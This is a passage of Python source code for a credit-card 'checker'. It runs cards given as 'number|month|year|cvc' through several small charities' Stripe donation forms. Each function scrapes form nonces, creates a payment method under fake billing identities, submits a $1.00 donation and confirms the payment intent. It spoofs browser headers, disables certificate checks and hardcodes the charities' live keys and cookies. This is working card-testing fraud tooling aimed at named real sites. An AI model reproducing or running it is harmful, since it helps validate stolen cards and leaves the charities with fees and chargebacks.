    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fwww.dohi.ca&time_on_page=18271&client_attribution_metadata[client_session_id]=8e710883-c2bf-447e-859d-ec1d09218c59&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Qi5BILcqTD1o1N6EA79Mc7D98VpctqWDLKLFeA4XXmRVY5G6M7PUoZJJCJJhG7bqjFVP9R2rO1CRR8rdjodN6PR00WYir86gk'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G6 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '_tccl_visitor': '80f64d4c-36b7-48f7-aed9-a36052317d58',
    'cmplz_banner-status': 'dismissed',
    'cmplz_policy_id': '28',
    'cmplz_marketing': 'deny',
    'cmplz_statistics': 'deny',
    'cmplz_preferences': 'deny',
    'cmplz_functional': 'allow',
    'cmplz_consented_services': '',
    '__stripe_mid': '526e6f9c-95d4-4af0-a925-6d7e37b14949f0aee3',
    'charitable_session': '4081c5cea29ebdf767b74fced4e64d81||86400||82800',
    '_tccl_visit': '81b4232e-bd37-455c-be95-6cec37fa860d',
    '_scc_session': 'pc=1&C_TOUCH=2025-12-18T06:24:22.490Z',
    '__stripe_sid': '1238082f-6e80-44da-a403-e7ebf67d645585459a',
        }
        headers = {
    'authority': 'www.dohi.ca',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.dohi.ca',
    'pragma': 'no-cache',
    'referer': 'https://www.dohi.ca/campaigns/summer-camp-ukraine/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/summer-camp-ukraine/',
    'campaign_id': f'{campaign_id}',
    'description': 'Summer Camp Ukraine',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'contact_consent': '1',
    'cover_fees': '1',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://www.dohi.ca/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Qi5BILcqTD1o1N6EA79Mc7D98VpctqWDLKLFeA4XXmRVY5G6M7PUoZJJCJJhG7bqjFVP9R2rO1CRR8rdjodN6PR00WYir86gk',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")         

#============================================
# --- Main CC Check Function ---
def go7(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://youthnavigation.com/?campaign=right-path-bright-future-journey&donate=1', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G7 ID Response: {form_id}")
        print(f"G7 ID Response: {donation_nonce}")
        print(f"G7 ID Response: {campaign_id}")
        print(f"G7 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=AF&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fyouthnavigation.com&time_on_page=26601&client_attribution_metadata[client_session_id]=b8ccfb73-531a-4f5f-806a-c187404bf4aa&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PoRniGyxvehXwNqv9mXT43nRISSymJJqtzNNRutsGSYJdp0mISH0j3tGymmAPOfRu3TnuFw48ay9613tl32cVQU00WhMe92Fe'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G7 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'charitable_session': 'f5377a92140b03923360385855f119cc||86400||82800',
            '__stripe_mid': 'fb0d5236-4918-4a3f-a4cd-59e8494d50622a41cb',
            '__stripe_sid': 'ee7cf216-125d-4cf5-ade2-b35b163bc9abeff6e5',
        }
        
        headers = {
            'authority': 'youthnavigation.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'charitable_session=f5377a92140b03923360385855f119cc||86400||82800; __stripe_mid=fb0d5236-4918-4a3f-a4cd-59e8494d50622a41cb; __stripe_sid=ee7cf216-125d-4cf5-ade2-b35b163bc9abeff6e5',
            'origin': 'https://youthnavigation.com',
            'referer': 'https://youthnavigation.com/?campaign=right-path-bright-future-journey&donate=1',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/?campaign=right-path-bright-future-journey&donate=1',
            'campaign_id': f'{campaign_id}',
            'description': 'Right Path, Bright Future Journey',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '',
            'address_2': '',
            'city': '',
            'state': '',
            'postcode': '',
            'country': 'AF',
            'phone': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://youthnavigation.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51PoRniGyxvehXwNqv9mXT43nRISSymJJqtzNNRutsGSYJdp0mISH0j3tGymmAPOfRu3TnuFw48ay9613tl32cVQU00WhMe92Fe',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go8(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G8 ID Response: {form_id}")
        print(f"G8 ID Response: {donation_nonce}")
        print(f"G8 ID Response: {campaign_id}")
        print(f"G8 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=31687&client_attribution_metadata[client_session_id]=b7898d10-3066-4d12-b150-d3ee91400645&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G8 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'charitable_session': '2e870f0b15b7ec8b7517e12588c9ee59||86400||82800',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_first_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F',
            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
            '__stripe_sid': '2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
        }
        
        headers = {
            'authority': 'gods-dna.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'charitable_session=2e870f0b15b7ec8b7517e12588c9ee59||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; __stripe_sid=2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
            'origin': 'https://gods-dna.com',
            'referer': 'https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
            'campaign_id': f'{campaign_id}',
            'description': 'Donate Clothing, Blankets, Household Goods, etc.',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '',
            'address_2': '',
            'city': '',
            'state': '',
            'postcode': '',
            'country': 'US',
            'phone': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
        
#============================================
# --- Main CC Check Function ---
def go9(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://alexandrasangels.org/donate-now/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G9 ID Response: {form_id}")
        print(f"G9 ID Response: {donation_nonce}")
        print(f"G9 ID Response: {campaign_id}")
        print(f"G9 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=10002&billing_details[address][state]=New+York&billing_details[phone]=4303000850&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Falexandrasangels.org&time_on_page=43543&client_attribution_metadata[client_session_id]=51bf6c5c-296c-469b-ab72-91fa57e9a5d6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G9 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            '_ga_12WNKT9JXT': 'GS2.1.s1767343596$o1$g0$t1767343596$j60$l0$h0',
            '_ga': 'GA1.1.628768292.1767343597',
            'charitable_session': 'b6111f4739b8970ee3cf674a8d7f0682||86400||82800',
            '_gauges_unique_hour': '1',
            '_gauges_unique_day': '1',
            '_gauges_unique_month': '1',
            '_gauges_unique_year': '1',
            '_gauges_unique': '1',
            '__stripe_mid': 'ace11272-9b1b-44b9-a749-c1ac8d3343c9d4336f',
            '__stripe_sid': 'ae734e13-b357-4e55-b200-82574fed8d0c18c7e2',
        }
        
        headers = {
            'authority': 'alexandrasangels.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga_12WNKT9JXT=GS2.1.s1767343596$o1$g0$t1767343596$j60$l0$h0; _ga=GA1.1.628768292.1767343597; charitable_session=b6111f4739b8970ee3cf674a8d7f0682||86400||82800; _gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; __stripe_mid=ace11272-9b1b-44b9-a749-c1ac8d3343c9d4336f; __stripe_sid=ae734e13-b357-4e55-b200-82574fed8d0c18c7e2',
            'origin': 'https://alexandrasangels.org',
            'referer': 'https://alexandrasangels.org/donate-now/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/donate-now/',
            'campaign_id': f'{campaign_id}',
